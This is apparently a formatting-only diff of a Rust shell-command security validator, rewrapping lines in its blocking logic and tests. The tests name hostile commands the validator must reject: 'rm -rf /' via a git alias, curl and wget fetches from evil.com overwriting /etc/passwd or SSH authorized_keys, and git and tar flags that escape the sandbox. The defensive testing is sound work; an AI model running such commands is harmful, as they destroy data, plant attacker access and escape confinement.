@@ -623,11 +623,8 @@ fn check_shell_injection(command: &str) -> Option<ValidationResult> {
     // Block ${...} variable expansion (more complex forms)
     if command.contains("${") {
         return Some(
-            ValidationResult::blocked(
-                RiskLevel::Blocked,
-                "Variable expansion ${...} is blocked",
-            )
-            .with_pattern("${...}"),
+            ValidationResult::blocked(RiskLevel::Blocked, "Variable expansion ${...} is blocked")
+                .with_pattern("${...}"),
         );
     }
 
@@ -893,7 +890,11 @@ mod tests {
                 .allowed
         );
         assert!(!validator.validate("git -c alias.x='!rm -rf /' x").allowed);
-        assert!(!validator.validate("git --config core.pager=less status").allowed);
+        assert!(
+            !validator
+                .validate("git --config core.pager=less status")
+                .allowed
+        );
 
         // Should still allow normal git commands
         assert!(validator.validate("git status").allowed);
@@ -907,8 +908,16 @@ mod tests {
         // git --work-tree and --git-dir can escape the sandbox
         assert!(!validator.validate("git --work-tree=/etc status").allowed);
         assert!(!validator.validate("git --git-dir=/tmp/.git status").allowed);
-        assert!(!validator.validate("git --work-tree=/home/user status").allowed);
-        assert!(!validator.validate("git --git-dir=../other/.git log").allowed);
+        assert!(
+            !validator
+                .validate("git --work-tree=/home/user status")
+                .allowed
+        );
+        assert!(
+            !validator
+                .validate("git --git-dir=../other/.git log")
+                .allowed
+        );
     }
 
     #[test]
@@ -916,9 +925,21 @@ mod tests {
         let validator = SecurityValidator::new();
 
         // Output to file can overwrite arbitrary files
-        assert!(!validator.validate("curl http://evil.com -o /etc/passwd").allowed);
-        assert!(!validator.validate("wget http://evil.com -o /tmp/script.sh").allowed);
-        assert!(!validator.validate("curl --output /home/user/.ssh/authorized_keys http://evil.com").allowed);
+        assert!(
+            !validator
+                .validate("curl http://evil.com -o /etc/passwd")
+                .allowed
+        );
+        assert!(
+            !validator
+                .validate("wget http://evil.com -o /tmp/script.sh")
+                .allowed
+        );
+        assert!(
+            !validator
+                .validate("curl --output /home/user/.ssh/authorized_keys http://evil.com")
+                .allowed
+        );
     }
 
     #[test]
@@ -927,7 +948,11 @@ mod tests {
 
         // tar -C can extract to arbitrary directories
         assert!(!validator.validate("tar -xf archive.tar -C /etc").allowed);
-        assert!(!validator.validate("tar -xzf file.tgz -C /home/user").allowed);
+        assert!(
+            !validator
+                .validate("tar -xzf file.tgz -C /home/user")
+                .allowed
+        );
     }
 
     // === EXTRACT BASE COMMAND WITH FLAGS TESTS ===
